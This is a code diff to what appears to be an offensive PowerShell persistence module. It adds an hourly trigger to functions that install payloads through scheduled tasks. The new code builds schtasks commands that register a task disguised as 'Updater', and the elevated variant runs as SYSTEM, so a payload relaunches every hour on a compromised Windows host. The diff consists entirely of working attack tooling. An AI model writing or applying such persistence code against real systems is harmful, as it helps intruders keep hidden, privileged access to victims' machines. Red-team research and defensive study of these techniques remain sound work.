@@ -55,6 +55,10 @@ function New-ElevatedPersistenceOption
 
     Starts the payload daily.
 
+.PARAMETER Hourly
+
+    Starts the payload hourly.
+
 .PARAMETER At
 
     Starts the payload at the specified time. You may specify times in the following formats: '12:31 AM', '2 AM', '23:00:00', or '4:06:26 PM'.
@@ -83,6 +87,7 @@ function New-ElevatedPersistenceOption
         $PermanentWMI,
 
         [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
+        [Parameter( ParameterSetName = 'ScheduledTaskHourly', Mandatory = $True )]
         [Parameter( ParameterSetName = 'ScheduledTaskAtLogon', Mandatory = $True )]
         [Parameter( ParameterSetName = 'ScheduledTaskOnIdle', Mandatory = $True )]
         [Switch]
@@ -96,6 +101,10 @@ function New-ElevatedPersistenceOption
         [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
         [Switch]
         $Daily,
+
+        [Parameter( ParameterSetName = 'ScheduledTaskHourly', Mandatory = $True )]
+        [Switch]
+        $Hourly,
 
         [Parameter( ParameterSetName = 'PermanentWMIDaily', Mandatory = $True )]
         [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
@@ -156,6 +165,12 @@ function New-ElevatedPersistenceOption
             $PersistenceOptionsTable['Time'] = $At
         }
 
+        'ScheduledTaskHourly'
+        {
+            $PersistenceOptionsTable['Method'] = 'ScheduledTask'
+            $PersistenceOptionsTable['Trigger'] = 'Hourly'
+        }
+
         'Registry'
         {
             $PersistenceOptionsTable['Method'] = 'Registry'
@@ -214,6 +229,10 @@ function New-UserPersistenceOption
 
     Starts the payload daily.
 
+.PARAMETER Hourly
+
+    Starts the payload hourly.
+
 .PARAMETER At
 
     Starts the payload at the specified time. You may specify times in the following formats: '12:31 AM', '2 AM', '23:00:00', or '4:06:26 PM'.
@@ -233,6 +252,7 @@ function New-UserPersistenceOption
 
     [CmdletBinding()] Param (
         [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
+        [Parameter( ParameterSetName = 'ScheduledTaskHourly', Mandatory = $True )]
         [Parameter( ParameterSetName = 'ScheduledTaskOnIdle', Mandatory = $True )]
         [Switch]
         $ScheduledTask,
@@ -244,6 +264,10 @@ function New-UserPersistenceOption
         [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
         [Switch]
         $Daily,
+
+        [Parameter( ParameterSetName = 'ScheduledTaskHourly', Mandatory = $True )]
+        [Switch]
+        $Hourly,
 
         [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
         [DateTime]
@@ -283,6 +307,12 @@ function New-UserPersistenceOption
             $PersistenceOptionsTable['Method'] = 'ScheduledTask'
             $PersistenceOptionsTable['Trigger'] = 'Daily'
             $PersistenceOptionsTable['Time'] = $At
+        }
+
+        'ScheduledTaskHourly'
+        {
+            $PersistenceOptionsTable['Method'] = 'ScheduledTask'
+            $PersistenceOptionsTable['Trigger'] = 'Hourly'
         }
 
         'Registry'
@@ -574,6 +604,11 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
                     $ElevatedTrigger = "schtasks /Create /RU system /SC DAILY /ST $($ElevatedPersistenceOption.Time.ToString('HH:mm:ss')) /TN Updater /TR "
                 }
 
+                'Hourly'
+                {
+                    $ElevatedTrigger = "schtasks /Create /RU system /SC HOURLY /TN Updater /TR "
+                }
+
                 'OnIdle'
                 {
                     $ElevatedTrigger = "schtasks /Create /RU system /SC ONIDLE /I 1 /TN Updater /TR "
@@ -615,6 +650,11 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
                 'Daily'
                 {
                     $UserTrigger = "schtasks /Create /SC DAILY /ST $($UserPersistenceOption.Time.ToString('HH:mm:ss')) /TN Updater /TR "
+                }
+
+                'Hourly'
+                {
+                    $UserTrigger = "schtasks /Create /SC HOURLY /TN Updater /TR "
                 }
 
                 'OnIdle'
